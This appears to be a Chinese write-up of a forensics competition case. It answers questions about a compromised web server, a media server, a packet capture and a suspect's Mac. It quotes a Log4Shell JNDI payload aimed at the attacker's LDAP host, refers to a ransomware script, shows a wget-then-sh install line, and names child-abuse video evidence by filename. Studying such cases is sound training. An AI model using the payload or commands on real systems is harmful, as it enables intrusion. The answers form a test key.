src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071709939.png" alt="image-20231107170944899"></p><p>直接在UFS上手撸  查看<code>/etc/nginx/conf.d/agcom.shop.conf</code>网站配置文件 找到访问失败成功记录文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071711043.png" alt="image-20231107171107988"></p><p>没找到东西  但是在同目录下有很多其他日志</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071713846.png" alt="image-20231107171346799"></p><p>在里面找shell出现的次数  发现是17次</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071719529.png" alt="image-20231107171931469"></p><h3 id="49"><a href="#49" class="headerlink" title="49"></a>49</h3><pre><code>[单选题] 哪一个IP地址尝试登录’VM’ (虚拟机) 编号 ‘111’ 失败次数最多? (1分)A. 38.242.130.207B. 218.92.0.206C. 43.142.93.22D. 121.202.141.105E. 61.238.217.108</code></pre><pre><code>A</code></pre><p>在&#x2F;var&#x2F;log&#x2F;btmp.1和&#x2F;var&#x2F;log&#x2F;btmp中进行翻找 发现<code>38.242.130.207</code>出现的次数更多</p><h3 id="50"><a href="#50" class="headerlink" title="50"></a>50</h3><pre><code>[填空题] 黑客在入侵 ‘VM’ 编号 ‘111’ 后，打算涂改AGC公司的网页，黑客在传送相关档案时所用的端口 (Port) 是什么? (以阿拉伯数字回答) (3分)</code></pre><pre><code>22</code></pre><p>在<code>/usr/AGC/folder</code>中找到黑客就是王景浩上传的文件  index.html中的内容确实表示王景浩篡改了网页</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071744898.png" alt="image-20231107174424838"></p><p>在王景浩的电脑中也发现了它使用scp向AGC服务器中传文件的命令行记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071746905.png" alt="image-20231107174615840"></p><p>scp默认使用的端口也是22</p><h3 id="51"><a href="#51" class="headerlink" title="51"></a>51</h3><pre><code>[多选题] 根据 ‘VM’ 编号 ‘111’ 里的网页服务器 (Web Server) 的设定，访客可从下列哪个网页地址访问这个服务器? (2分)A. localhostB. www.ag.com.shopC. www.agcom.shopD. agcom.shopE. www.agcom.com</code></pre><pre><code>DE</code></pre><p>还是查看配置文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071747322.png" alt="image-20231107174719274"></p><h3 id="52"><a href="#52" class="headerlink" title="52"></a>52</h3><pre><code>[填空题] 黑客曾入侵 ‘VM’ 编号 ‘111’ 里的电邮系统 ‘Xeams’，他登录的时间是? (以unix时间戳回答，格式如:1665049779010) (2分)</code></pre><pre><code>1665049779010</code></pre><p>由王景浩部分可知 其电脑的ip是<code>61.238.217.108</code> 在server1中翻找 发现<code>/$/opt/Xeams/AuditLogs</code>下是Xeatm电邮系统的日志文件 找到王景浩电脑ip的登陆日志 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071834329.png" alt="image-20231107183452280"></p><h3 id="53"><a href="#53" class="headerlink" title="53"></a>53</h3><pre><code>[单选题] 黑客在入侵后盗用AGC员工电邮户口及冒充AGC员工回复了电邮给客户，发出这封电邮的操作系统 (Operating System) 及电邮软件 (Mail Agent) 是什么? (2分)A. Mac OS X 10.15 rv:102.0 Thunderbird/102.3.0B. Mac OS X 10.15 rv:102.0 Thunderbird/91.13.1C. Mac OS X 10.11 rv:91.0 Thunderbird/91.13.1D. Mac OS X 10.11 rv:60.0 Thunderbird/60.9.1E. Windows 10 Pro Outlook 2016</code></pre><pre><code>D</code></pre><p>由52题得知王景浩入侵电邮系统的时间 是在<code>2022-10-06 17:49:39</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071839785.png" alt="image-20231107183914743"></p><p>那我们找发送邮件记录的时间也应当在10月6号17:49:39之后 在<code>/$/opt/Xeams/GoodEmails</code>中找到发送邮件的记录 在这四封邮件中进行寻找</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311072104203.png" alt="image-20231107210420150"></p><p>应该是这封了 伪造邮件骗取钱财 在user-agent中找到信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311072107875.png" alt="image-20231107210718828"></p><h3 id="54"><a href="#54" class="headerlink" title="54"></a>54</h3><pre><code>[单选题] 黑客在 ‘Proxmox’ 里留下了一个被加密了的程序 (Program)，在解密后它的SHA-256哈希值 (Hash Value) 是什么? (2分)A. C89D7A… …8C4E76B. C7141F… …64BF65C. E9433E… …1A5134D. 45CE1C… …79BD4AE. 0ACAA5… …AB7ECE</code></pre><pre><code>0acaa5332a0d035b6f90b12836b6fa84c45af5c76a7bda6f0c6bec77b3ab7ece</code></pre><p>先是下载了三个文件 再将其合并为<code>base.py</code> 再将base.py解base 在重命名 然后使用python运行了这个程序 之后将这两个文件都删除了 但是1 2 3 三个文件没有删除 我们还是可以进行恢复的 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311072131187.png" alt="image-20231107213127127"></p><p>在<code>/$/srv/samba/share/AGC photo</code>(通过看命令行进目录的记录)文件夹下我们可以找到这三个文件 导出 进行恢复</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919375.png" alt="image-20231108091108935"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919324.png" alt="image-20231108091124678"></p><h3 id="55"><a href="#55" class="headerlink" title="55"></a>55</h3><pre><code>[填空题] 承上题，分析程序代码 (Program Code)，上述程序的档案名应该是什么? (不要输入 ‘.’，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG) (3分)</code></pre><pre><code>RANSOMWAREVERFINALV2PY</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919210.png" alt="image-20231108090442771"></p><h3 id="56"><a href="#56" class="headerlink" title="56"></a>56</h3><pre><code>[单选题] 于虚拟机 ‘VM’ 编号 ‘111’ 里的档案 ‘\srv\samba\share\AGCphoto\DSC01139.JPG’ ，照片中出现的街道名称是? (2分)A. 河背街B. 沙咀道C. 众安街D. 香车街E. 川龙街</code></pre><pre><code>C</code></pre><p>上题提到的加密脚本 后面被注释的部分就是解密脚本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919512.png" alt="image-20231108092136998"></p><p>在<code>/$/srv/samba/share/AGC photo</code>找到被加密的图片 在<code>/$/tmp</code>找到密钥文件 <code>thekey.key</code>  应该仿真起来 在虚拟机中直接运行就行 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919924.png" alt="image-20231108093250713"></p><h2 id="AGC流媒体服务器"><a href="#AGC流媒体服务器" class="headerlink" title="AGC流媒体服务器"></a>AGC流媒体服务器</h2><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><pre><code>[填空题] 就AGC集团网络的流媒体服务器 (Media Server)，有多少个本地用户曾经成功登录过? (以阿拉伯数字回答) (1分)</code></pre><pre><code>3</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311051255182.png" alt="image-20231105125509127"></p><p>也可以用命令</p><pre><code>sudo last</code></pre><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><pre><code>[填空题] 就AGC集团网络的流媒体服务器，有多少个本地用户曾经成功用 ‘ssh’ (Secure Shell)登录过? (以阿拉伯数字回答) (2分)</code></pre><pre><code>3</code></pre><p>一共是3个ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311051300471.png" alt="image-20231105130019406"></p><p>也可以用命令</p><pre><code>lastlog</code></pre><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><pre><code>[填空题] 就上述的本地用户，成功通过 ‘ssh’ 登录过该流媒体服务器多少次? (以阿拉伯数字回答) (3分)</code></pre><pre><code>12</code></pre><p>还是上面那张图 一共是12次</p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><pre><code>[单选题] 试找找记录失败的登录尝试信息. 有以下哪一个名称曾尝试用 ‘ssh:notty’ 登录该流媒体服务器? (2分)A. iamhackerB. hackingC. hackD. hackerE. 以上皆非</code></pre><pre><code>C</code></pre><p><a href="https://blog.csdn.net/weixin_45362982/article/details/103310459?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169916107316800188544660%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169916107316800188544660&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-103310459-null-null.142%5Ev96%5Epc_search_result_base9&utm_term=btmp%E6%98%AF%E4%BB%80%E4%B9%88&spm=1018.2226.3001.4187">认识和分析日志文件</a></p><pre><code>使用 /var/log/btmp文件查看暴力破解系统的用户 /var/log/btmp文件是记录错误登录系统的日志 如果发现/var/log/btmp日志文件比较大，大于1M，就算大了，就说明很多人在暴力破解ssh服务，此日志需要使用lastb程序查看/var/log/wtmp文件的作用 /var/log/wtmp也是一个二进制文件，记录每个用户的登录次数和持续时间等信息。</code></pre><p>我们在备份日志文件中找到<code>btmp</code>日志 就可以查看登录失败的人</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311051316550.png" alt="image-20231105131638497"></p><p>也可以使用命令</p><pre><code>lastb -f /home/btmp</code></pre><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><pre><code>[填空题] 就该流媒体服务器的本地用户, 有一个用户名是 ‘S’ 开头的, 该用户的姓氏是什么? (以大写英文回答) (3分)</code></pre><pre><code>LI</code></pre><p>直接进行仿真 这里在仿真的时候要将5个盘全部挂上 不然后面找media的时候会找不到 选择重置密码即可登陆peter和user1的账户时显示需要重置密码 并且密码的长度必须大于8不能是弱密码 那就随便编一个稍微复杂点的密码 <code>96315001</code> 登陆成功</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311051559693.png" alt="image-20231105155929072"></p><p>我们从AGC集团调查报告中 可以获取一点信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311051608771.png" alt="image-20231105160837706"></p><p>先连xshell 连的时候直接连root用户就行 密码已经重置为123456了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919270.png" alt="image-20231106194241784"></p><p>上面的调查报告中提到 有<code>lsblk</code>和<code>zpool status</code> 检查一下 都没有问题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919187.png" alt="image-20231106194423818"></p><pre><code>lsblk命令的英文是“list block”，即用于列出所有可用块设备的信息，而且还能显示他们之间的依赖关系，但是它不会列出RAM盘的信息。块设备有硬盘，闪存盘，CD-ROM等等。lsblk命令包含在util-linux-ng包中，现在该包改名为util-linux。</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919699.png" alt="image-20231106194439043"></p><pre><code>&quot;zpool status&quot;是一个命令行指令，用于检查ZFS存储池的状态。它可以显示存储池的健康状态、错误信息、磁盘状态等信息。如果存储池处于DEGRADED状态，它还可以提供一些修复建议。可以使用不同的选项来获取更详细的信息，例如“-v”选项可以列出带有详细说明的完成错误列表，“-T”选项可以显示时间戳 最后一行errors:No known data errors就是现在服务器中的硬件没有出现问题的</code></pre><p>连上xftp 还是看一下&#x2F;www文件夹 发现是个wordpress的网站 看一下数据库  这玩意好像没密码 直接进去了</p><pre><code>mysqlshow databasesshow columns from wp_usersselect * from wp_users</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919889.png" alt="image-20231106202812883"></p><p>可以看到sammy的姓氏是LI</p><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><pre><code>[多选题] 该流媒体服务器是有使用Docker容器 (Docker Container) 的，当中包含以下哪个Docker镜像 (Docker Image) ? (3分)A. apache2B. ubuntuC. centosD. nginxE. hello-worldF. 以上皆非</code></pre><pre><code>BCDE</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311051309900.png" alt="image-20231105130919852"></p><p>也可以使用命令</p><pre><code>docker images</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919981.png" alt="image-20231106203131203"></p><h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><pre><code>[单选题] 就上述的Docker镜像，哪一个镜像在系统上运行中? (2分)A. apache2B. ubuntuC. centosD. nginxE. hello-worldF. 以上皆非</code></pre><pre><code>D</code></pre><pre><code>docker ps -a(查看所有正在运行和运行过的镜像)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919754.png" alt="image-20231106203325294"></p><p>下面说一下docker一把梭</p><pre><code>## 先查看是否有docker-compose，有docker-compose起docker-compose即可docker-composedocker-compose up -d  # 在后台启动服务docker-compose ps   # 查看启动的服docker-compose stop #停止服务docker-compose stop &amp;&amp; docker-compose rm &amp;&amp; docker-compose down## 无docker-compose，手工单独起docker 优先使用历史记录中的命令systemctl start docker 运行dockerdocker version 查看docker版本docker info 显示Docker 系统信息，包括镜像和容器数uname –r 检查内核版本 /etc/docker/daemon.json Docker配置docker images或docker image ls（manage images） 列出所有镜像 docker image ls --no-trunc 不截断IMAGE IDdocker ps 列出所有运行中的容docker ps -a 列出所有容器docker start|stop|restart 启动、停止和重启一个或多个指定容器docker run 镜像名称/id docker run -d 镜像名称/id 后台运行 docker run -it 镜像名称/id /bin/bash 加载shelldocker run -P 随机端口映射docker run -p 指定端口映射--name= &quot;my-worpress&quot; 为容器指定一个名称--net=&quot;bridge&quot; 指定容器的网络连接类型--link=[] 添加链接到另一个容器--volume ,-v 绑定一个卷-v ~/nginx/conf.d:/etc/nginx/conf.d -v ~/nginx/nginx.conf:/etc/nginx/nginx.conf 宿主机绝对路径：容器内绝对路径docker kill 杀死一个或多个指定容器进程docker top 查看一个正在运行容器进程，支持 ps 命令参数docker inspect检查镜像或者容器的参数docker pause 暂停某一容器的所有进程docker exec -it containerID /bin/bash 进入docker容器docker logs 查看容器日志docker cp 容器ID:文件路径 宿主机目录      从容器中拷贝指定文件或者目录到宿主机中docker diff 检查容器里文件结构的更改docker history nginxdocker ps -a --no-trunc/var/lib/docker/container/id/id-json.log 日志--link 在hosts文件增加映射 容器名称 id 对应ipdocker run -d -p 8080:80 nginx-p: 指定端口映射，格式为：主机(宿主)端口:容器端口–volume , -v: 绑定一个数据卷-d: 后台运行容器，并返回容器ID；–name=“redis”: 为容器指定一个名称；-e username=“ritchie”: 设置环境变量；-m :设置容器使用内存最大值；数据卷容器多容器共享数据卷docker run -id --name db_data -v /db_data centos:7 创建数据卷容器docker run -id --name db1 --volumes-from db_data centos:7 挂载docker run -id --name db2 --volumes-from db_data centos:7 挂载 导入导出镜像 docker save docker load容器 docker export docker import （镜像）docker run 来运行网络--net=bridge 默认 桥接NAT--net=host 和主机共享--net=none --net=container=NAME or id 指定共享容器网络--net=my_net 自定义网络## 实在部署可视化管理工具portainer部署portainer（离线）docker save portain-ce:latest -o portainer.tardocker load -i portainer.tardocker run -d -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer-ce:latest部署portainer（在线）docker pull portainer/portainer-cedocker volume create portainer_datadocker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce### 新版宝塔也支持docker管理了，但是会破坏一部分环境，遇到疑难问题时可尝试centos：yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh ed8484becubuntu：wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh ed8484bec</code></pre><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><pre><code>[多选题] 该流媒体服务器是使用 ‘WordPress’ 建站 (Create Website) 的， 就 ‘比特币’ 标题， 有以下的电子邮箱地址曾经留有评论? (2分)A. cn.wordpress.orgB. root58462@mail.qq.comC. hi456@163.comD. root@163.comE. user1@localhost.netF. 以上皆非</code></pre><pre><code>CD</code></pre><p>查看服务器的历史命令可以得知 wordpress这个网站主要是由sammy搭建的  还有很多搭建时的命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919998.png" alt="image-20231106204617891"></p><p>mysql apache2服务都用了 检查一下服务是不是都正常开启的</p><pre><code>systemctl status apache2systemctl status mysqld</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919521.png" alt="image-20231106210453841"></p><p>刚刚通过xftp也看到了网站的根目录在&#x2F;www&#x2F;wordpress下 直接访问<code>192.168.70.131/wordpress</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919292.png" alt="image-20231106211545088"></p><p>访问比特币这个网页</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919179.png" alt="image-20231106211606257"></p><p>网页打不开 因为给又分配了一个url </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919911.png" alt="image-20231106211908315"></p><p>改回去就行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919287.png" alt="image-20231106212006545"></p><p>但是我们是看不到邮件的 还是翻数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919885.png" alt="image-20231106212254252"></p><h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><pre><code>[单选题] 该流媒体服务器里其中一个本地用户是有使用 ‘calendar’ 日历工具的, 日历内曾经提及以下哪个网站? (3分)A. https://weibo.comB. http://www.baidu.comC. https://www.douyin.comD. https://youku.comE. https://www.binance.comF. 以上皆非</code></pre><pre><code>E</code></pre><p>使用user用户登陆服务器 查看calendar 翻一翻 在2022年12月找到一个虚拟交易网的记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071044424.png" alt="image-20231107104405330"></p><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><pre><code>[单选题] 该流媒体服务器里是有使用磁盘阵列 (RAID) 的, 该设备是使用哪一个 RAID 级别? (请选择最合适的答案) (1分)A. RAID 0B. RAIDz2C. RAIDz3D. RAID 10E. RAID 5F. 以上皆非</code></pre><pre><code>D</code></pre><p>使用上面提到的<code>zpool status</code>命令看一下储存池的状态</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071057882.png" alt="image-20231107105711821"></p><p>里面提到mirror-0和mirror-1 看起来很像raid10的模式</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071105167.png" alt="image-20231107110508083"></p><p><a href="https://zhuanlan.zhihu.com/p/51170719">raid磁盘阵列是什么</a></p><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><pre><code>[单选题] 该基本镜像存储池 (Basic Storage Pool) 里储存了一些视频档案, 请找出一段儿童色情影片, 该档案的最后修改时间是什么月份? (2分)A. JunB. JulC. AugD. SepE. OctF. 以上皆非</code></pre><pre><code>D</code></pre><p>在根目录下找到一个<code>media0</code>文件夹  进去之后找到一个<code>迷住了_幼_迷住.mp4</code>视频 就是目标影片 在xftp中能看到最后修改时间是9月</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071114171.png" alt="image-20231107111432001"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071114741.png" alt="image-20231107111424701"></p><h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><pre><code>[填空题] 承上题，拥有该段儿童色情影片的用户名称是什么? (不要输入符号，以大写英文及阿拉伯数字回答) (1分)</code></pre><pre><code>ROOT</code></pre><p>接上题</p><h3 id="14"><a href="#14" class="headerlink" title="14"></a>14</h3><pre><code>[填空题] 就AGC集团网络的流媒体服务器，曾经有用户搜索过有关于儿童色情影片的资料而得到搜索结果，该用户所输入的网址是什么? (不要输入符号，以大写英文及阿拉伯数字回答，如 https://web3.com，需回答 HTTPSWEB3COM) (2分)</code></pre><pre><code>HTTPSBITLY3XYI8B5</code></pre><p>由上题 得知儿童色情影片的拥有者是root 在查看root用户的历史命令时看到这样一条</p><pre><code>curl -i -o link.html https://bit.ly/3xyi8b5这段命令的作用是使用curl工具从https://bit.ly/3xyi8b5下载文件，并将服务器的响应头信息输出到终端。其中，-i选项表示输出响应头信息，-o选项表示将下载的文件保存为link.html</code></pre><p>找一下link.html  发现<code>/home/peter/link.html</code></p><pre><code>find / -name link.html</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071127013.png" alt="image-20231107112709965"></p><p>访问一下  通过这个<code>moved here</code> 会直接跳转到<code>儿童色情</code>的搜索栏中 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071128198.png" alt="image-20231107112836146"></p><p>再将上面的内容解一下url编码 发现<code>儿童色情</code>关键词 说明就是从<code>https://bit.ly/3xyi8b5</code>网站下载的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071130707.png" alt="image-20231107113025657"></p><h3 id="15"><a href="#15" class="headerlink" title="15"></a>15</h3><pre><code>[填空题] 该基本镜像存储池 (pool) 有一个快照 (Snapshot)，快照的名称是什么? (不要输入符号，以大写英文及阿拉伯数字回答，如 media/mediapool@abc123，需回答MEDIAMEDIAPOOLABC123) (1分)</code></pre><pre><code>MEDIASTORAGE@VERESION1</code></pre><p><a href="https://www.cnblogs.com/zhangguosheng1121/p/13389051.html">ZFS文件系统介绍</a></p><p>使用命令</p><pre><code>zfs list -t snapshot</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071138395.png" alt="image-20231107113805347"></p><h3 id="16"><a href="#16" class="headerlink" title="16"></a>16</h3><pre><code>[填空题] 就上述所找到的基本镜像存储池快照 (Snapshot)，它储存了多少个档案? (以阿拉伯数字回答) (1分)</code></pre><pre><code>24</code></pre><p>找到了快照文件 直接翻在<code>/media0/mediastorage</code>中 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071403715.png" alt="image-20231107140330654"></p><h2 id="AGC流量包"><a href="#AGC流量包" class="headerlink" title="AGC流量包"></a>AGC流量包</h2><h3 id="21"><a href="#21" class="headerlink" title="21"></a>21</h3><pre><code>[单选题] 分析IP地址61.238.217.108向AGC服务器10.0.66.184发送的第一个 ‘GET’ 指令，它请求的统一资源定位系统 (Uniform Resource Locator - URL) 是什么? (1分)A. http://155.137.195.111:8080B. http://www.w3.org/2003/05/soap-envelopeC. http://61.238.217.108:8000D. 以上皆非</code></pre><pre><code>A</code></pre><p>找到61.238.217.108发送的第一个get指令 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920854.png" alt="image-20231106142443955"></p><p>追踪tcp流</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920020.png" alt="image-20231106142608226"></p><h3 id="22"><a href="#22" class="headerlink" title="22"></a>22</h3><pre><code>[单选题] IP地址61.238.217.108曾经向AGC服务器10.0.66.184发送 ‘POST’ 指令，它在 ‘HTML Form’ 项目的 ‘uname’ 栏所输入的字符串是什么? (1分)A. rootB. $&#123;jndi:ldap://61.238.217.108:1389/a&#125;C. application/x-www-form-urlencodedD. password</code></pre><pre><code>B</code></pre><p>直接向下翻找 找到第11个流 是攻击机向服务器发送的post指令 找到传入的uname参数的值 进行url解码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920511.png" alt="image-20231106142803413"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920909.png" alt="image-20231106142840573"></p><pre><code>$&#123;jndi:ldap://61.238.217.108:1389/a&#125;</code></pre><h3 id="23"><a href="#23" class="headerlink" title="23"></a>23</h3><pre><code>[单选题] AGC服务器10.0.66.184收到IP地址61.238.217.108的 ‘POST’ 指令后，它执行了哪些行动? (2分)A. 使用端口46858连接IP地址61.238.217.108的LDAP服务器的指定端口B. 于IP地址61.238.217.108下载了Exploit.classC. 使用端口49264连接IP地址61.238.217.108发送同步要求D. 以上皆是</code></pre><pre><code>D</code></pre><p>传入post指令是第11个流 我们继续向下翻找 第13个流是于IP地址61.238.217.108下载了Exploit.class</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920360.png" alt="image-20231106143216426"></p><p>第12个流是使用端口46858连接IP地址61.238.217.108的LDAP服务器的1389端口</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920576.png" alt="image-20231106143339769"></p><p>第14个流是使用端口49264连接IP地址61.238.217.108发送同步要求  可以看到攻击机通过连接服务器 在其上进行命令行执行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920883.png" alt="image-20231106143430174"></p><h3 id="24"><a href="#24" class="headerlink" title="24"></a>24</h3><pre><code>[填空题] 在上述行动后，IP地址61.238.217.108利用哪个端口 (Port) 向AGC服务器10.0.66.184发出指令? (以阿拉伯数字回答) (1分)</code></pre><pre><code>9001</code></pre><p>接上题 </p><h3 id="25"><a href="#25" class="headerlink" title="25"></a>25</h3><pre><code>[多选题] AGC服务器10.0.66.184里有一个AGC目录 (Directory)，它的子目录 (Sub Directory) 包含以下哪一个? (2分)A. AccountingB. PictureC. StaffD. SambashareE. Retail</code></pre><pre><code>ACE</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920157.png" alt="image-20231106144124903"></p><h3 id="26"><a href="#26" class="headerlink" title="26"></a>26</h3><pre><code>[多选题] 入侵者迸入AGC服务器10.0.66.184后，他成功执行以下哪些指令? (2分)A. 檢视了readme.txt内容B. 删除了三个档案C. 删除了一个目录 (Directory)D. 替档案改名E. 建立了两个txt档案</code></pre><pre><code>DE</code></pre><p>还是在第14个流中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920829.png" alt="image-20231106144240170"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920839.png" alt="image-20231106144308867"></p><h3 id="27"><a href="#27" class="headerlink" title="27"></a>27</h3><pre><code>[单选题] 入侵者曾经传送一个档案到AGC服务器10.0.66.184并将它改名 (Rename)，这个档案的原来名称是什么？ (1分)A. cGhvdG9zT0Zyb2NreQ==B. Finanical.xlsC. readme.txtD. anonymous</code></pre><pre><code>A</code></pre><p>接上题</p><h3 id="28"><a href="#28" class="headerlink" title="28"></a>28</h3><pre><code>[单选题] 承上题，该档案原档的建立日期是什么? (2分)A. 2022-10-21 08:10:30 (UTC+0)B. 2022-10-21 16:19:39 (UTC+0)C. 2022-10-22 08:10:30 (UTC+0)D. 2022-10-22 14:22:06 (UTC+0)E. 2022-10-22 16:19:39(UTC+0)</code></pre><pre><code>C</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920953.png" alt="image-20231106144343927"></p><h3 id="29"><a href="#29" class="headerlink" title="29"></a>29</h3><pre><code>[单选题] 承上题，该档案的SHA-256哈希值是什么? (3分)A. a6eef1… …27364cB. 54785c… …fe86f0C. 961f2b… …647d55D. a00e6c… …d0eaabE. 以上皆非</code></pre><pre><code>B</code></pre><p>由上题我们可以看到这是用ftp协议传输的文件 我们选择导出对象——FTP-DATA 将下载的文件导出 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920644.png" alt="image-20231106144438454"></p><p>计算哈希值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920335.png" alt="image-20231106144643573"></p><h2 id="王景浩计算机"><a href="#王景浩计算机" class="headerlink" title="王景浩计算机"></a>王景浩计算机</h2><h3 id="30"><a href="#30" class="headerlink" title="30"></a>30</h3><pre><code>[多选题] 通过取证调查结果迸行分析 (包括但不限于以上问题及情节)，以下哪项关于王景浩的推断是正确的? (5分)A. 曾经采用他的计算机入侵AGC集团网络B. 传播儿童色情物品C. 于AGC集团取得大量客户资料D. 通过VPN取得Rooney家里的IP地址E. 企图更改AGC集团的网页</code></pre><pre><code>ACDE</code></pre><h3 id="57"><a href="#57" class="headerlink" title="57"></a>57</h3><pre><code>[单选题] 王景浩的计算机使用什么文件系统 (File System) ? (1分)A. exFATB. APFSC. HFSD. HFS+</code></pre><pre><code>D</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920918.png" alt="image-20231030160752112"></p><h3 id="58"><a href="#58" class="headerlink" title="58"></a>58</h3><pre><code>[单选题] 王景浩计算机的操作系统 (Operating System) 版本是什么? (1分)A. 10.4.11B. 10.9.5C. 10.10.5D. 10.11.6</code></pre><pre><code>D</code></pre><p>  <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920469.png" alt="image-20231029214523992"></p><h3 id="59"><a href="#59" class="headerlink" title="59"></a>59</h3><pre><code>[填空题] 王景浩的计算机当前有多少个用户 (包括访客 &#39;Guest&#39; )? (以阿拉伯数字回答) (1分)</code></pre><pre><code>6</code></pre><p>最后一个被删除了 所以还剩下6个</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920059.png" alt="image-20231030160913453"></p><h3 id="60"><a href="#60" class="headerlink" title="60"></a>60</h3><pre><code>[填空题] 王景浩的计算机里有一个用户被删除，被删除的用户名称是什么? (以大写英文回答) (1分)</code></pre><pre><code>BROTHER</code></pre><p>接上题 </p><h3 id="61"><a href="#61" class="headerlink" title="61"></a>61</h3><pre><code>[填空题] 王景浩的计算机有多少个 &#39;聚焦&#39; 的搜索记録 